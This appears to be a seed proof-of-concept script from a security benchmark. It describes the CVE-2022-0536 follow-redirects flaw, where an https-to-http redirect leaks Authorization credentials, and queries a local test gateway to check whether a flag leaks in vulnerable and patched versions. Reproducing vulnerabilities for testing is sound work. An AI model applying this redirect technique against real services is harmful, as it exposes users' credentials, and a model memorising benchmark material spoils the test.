#!/usr/bin/env python3
"""[GIVEN] original_poc.py -- CVE-2022-0536 seed exploit (scheme-downgrade credential leak).

follow-redirects <= 1.14.7 dropped Authorization/Cookie only when the redirect went to a
different HOST, ignoring a scheme DOWNGRADE (https -> http) to the SAME host. A page served
over https that 302-redirects to http://<same-host>/... therefore leaks the Authorization
header (Basic credentials) over plaintext.

This PoC hits the HTTP gateway to run the probe inside the container.

  V0 (1.14.7): leaks  -> flag reaches the collector.
  V1 (1.14.8): BLOCKED -> CVE-2022-0536 fix adds scheme check.

Run via the oracle:  original_poc(version="v0"|"v1").
"""
import json
import os
import urllib.request

HOST = os.environ.get("PCB_HOST", "127.0.0.1")
_PORT_ENV = os.environ.get("PCB_PORT") or os.environ.get("PCB_TARGET_PORT")
PORTS = {"v0": 39506, "v1": 39507, "v2": 39508}


def original_poc(version="v1"):
    port = int(_PORT_ENV) if _PORT_ENV else PORTS[version]
    url = f"http://{HOST}:{port}/probe?mode=seed"
    try:
        resp = urllib.request.urlopen(url, timeout=30)
        data = json.loads(resp.read().decode())
    except Exception as e:
        return f"ERROR: {e}"
    headers_body = data.get("headers", "")
    return f"SEED_FINAL_HEADERS:{headers_body}"


if __name__ == "__main__":
    import sys
    print(original_poc(sys.argv[1] if len(sys.argv) > 1 else "v1"))
